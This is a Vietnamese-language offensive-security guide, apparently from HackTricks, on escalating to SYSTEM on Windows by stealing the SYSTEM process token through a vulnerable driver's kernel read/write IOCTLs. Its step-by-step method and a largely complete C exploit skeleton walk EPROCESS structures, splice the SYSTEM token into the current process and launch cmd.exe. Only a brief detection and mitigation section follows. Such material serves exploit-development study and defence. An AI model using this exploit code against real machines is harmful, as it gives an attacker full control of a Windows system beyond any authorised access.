# Windows kernel EoP: Token stealing với arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## Tổng quan

Nếu một vulnerable driver cung cấp IOCTL cho phép attacker có các primitive arbitrary kernel read và/hoặc write, thường có thể nâng quyền lên NT AUTHORITY\SYSTEM bằng cách đánh cắp access token của SYSTEM. Kỹ thuật này sao chép con trỏ Token từ EPROCESS của một SYSTEM process sang EPROCESS của process hiện tại.<sup>[[2]](#references)</sup>

Cách thức hoạt động:
- Mỗi process có một cấu trúc EPROCESS chứa (cùng với các trường khác) Token (thực chất là một EX_FAST_REF trỏ đến token object).
- SYSTEM process (PID 4) giữ một token có mọi privilege được bật.
- Thay EPROCESS.Token của process hiện tại bằng con trỏ token của SYSTEM khiến process hiện tại lập tức chạy với quyền SYSTEM.<sup>[[1]](#references)</sup>

> Các offset trong EPROCESS khác nhau tùy phiên bản Windows. Hãy xác định chúng một cách động (symbols) hoặc dùng các hằng số dành riêng cho từng phiên bản. Cũng cần nhớ rằng EPROCESS.Token là một EX_FAST_REF (3 bit thấp là các cờ reference count).

## Các bước tổng quát

1) Xác định base của ntoskrnl.exe và resolve địa chỉ của PsInitialSystemProcess.
   - Từ user mode, dùng NtQuerySystemInformation(SystemModuleInformation) hoặc EnumDeviceDrivers để lấy base của các driver đã được load.
   - Cộng offset của PsInitialSystemProcess (lấy từ symbols/reversing) vào kernel base để có địa chỉ của nó.
2) Đọc con trỏ tại PsInitialSystemProcess → đây là con trỏ kernel đến EPROCESS của SYSTEM.
3) Từ EPROCESS của SYSTEM, đọc các offset UniqueProcessId và ActiveProcessLinks để duyệt danh sách liên kết đôi các cấu trúc EPROCESS (ActiveProcessLinks.Flink/Blink) cho đến khi tìm thấy EPROCESS có UniqueProcessId bằng GetCurrentProcessId(). Lưu lại cả hai:
   - EPROCESS_SYSTEM (của SYSTEM)
   - EPROCESS_SELF (của process hiện tại)
4) Đọc giá trị token của SYSTEM: Token_SYS = *(EPROCESS_SYSTEM + TokenOffset).
   - Mask 3 bit thấp: Token_SYS_masked = Token_SYS & ~0xF (thường là ~0xF hoặc ~0x7 tùy build; trên x64, 3 bit thấp được sử dụng — mask 0xFFFFFFFFFFFFFFF8).
5) Phương án A (phổ biến): Giữ lại 3 bit thấp từ token hiện tại và ghép chúng vào con trỏ của SYSTEM để duy trì tính nhất quán của ref count được nhúng.
   - Token_ME = *(EPROCESS_SELF + TokenOffset)
   - Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) Dùng kernel write primitive để ghi Token_NEW trở lại (EPROCESS_SELF + TokenOffset).
7) Process hiện tại của bạn giờ đã là SYSTEM. Có thể spawn cmd.exe hoặc powershell.exe mới để xác nhận.<sup>[[1]](#references)</sup>

## Pseudocode

Dưới đây là skeleton chỉ dùng hai IOCTL từ một vulnerable driver: một IOCTL để đọc 8 byte kernel và một IOCTL để ghi 8 byte kernel. Thay bằng interface của driver bạn dùng.<sup>[[1]](#references)</sup>

```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
    struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
    in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
    struct { uint64_t addr, val; } in; DWORD ret;
    in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
    LPVOID drivers[1024]; DWORD cbNeeded;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
        return (uint64_t)drivers[0]; // first is typically ntoskrnl
    }
    return 0;
}

int main(void) {
    HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return 1;

    // 1) Resolve PsInitialSystemProcess
    uint64_t nt = get_nt_base();
    uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

    // 2) Read SYSTEM EPROCESS
    uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

    // 3) Walk ActiveProcessLinks to find current EPROCESS
    DWORD myPid = GetCurrentProcessId();
    uint64_t cur = EPROC_SYS; // list is circular
    uint64_t EPROC_ME = 0;
    do {
        uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
        if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
        uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
        cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
    } while (cur != EPROC_SYS);

    // 4) Read tokens
    uint64_t tok_sys, tok_me;
    kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
    kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

    // 5) Mask EX_FAST_REF low bits and splice refcount bits
    uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
    uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

    // 6) Write back
    kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

    // 7) We are SYSTEM now
    system("cmd.exe");
    return 0;
}
```

Ghi chú:
- Offsets: Dùng `dt nt!_EPROCESS` của WinDbg với PDB của mục tiêu hoặc runtime symbol loader để lấy offsets chính xác. Không hardcode một cách mù quáng.
- Mask: Trên x64, token là EX_FAST_REF; 3 bit thấp là các bit reference count. Giữ nguyên các bit thấp ban đầu từ token của bạn để tránh gây bất nhất refcount tức thì.
- Stability: Ưu tiên nâng quyền process hiện tại; nếu nâng quyền một helper tồn tại ngắn hạn, bạn có thể mất quyền SYSTEM khi nó thoát.<sup>[[1]](#references)</sup>

## Phát hiện & giảm thiểu
- Nguyên nhân gốc là việc load các driver bên thứ ba không được ký hoặc không đáng tin cậy, có các IOCTL mạnh.
- Kernel Driver Blocklist (HVCI/CI), DeviceGuard và các quy tắc Attack Surface Reduction có thể ngăn các driver dễ bị tấn công được load.
- EDR có thể theo dõi các chuỗi IOCTL đáng ngờ dùng để thực hiện arbitrary read/write và các lần hoán đổi token.

## References

- [1] [HTB Reaper: Lỗi leak format string + stack BOF → VirtualAlloc ROP (RCE) và đánh cắp kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [2] [FuzzySecurity – Windows Kernel ExploitDev (ví dụ đánh cắp token)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)
{{#include ../../banners/hacktricks-training.md}}
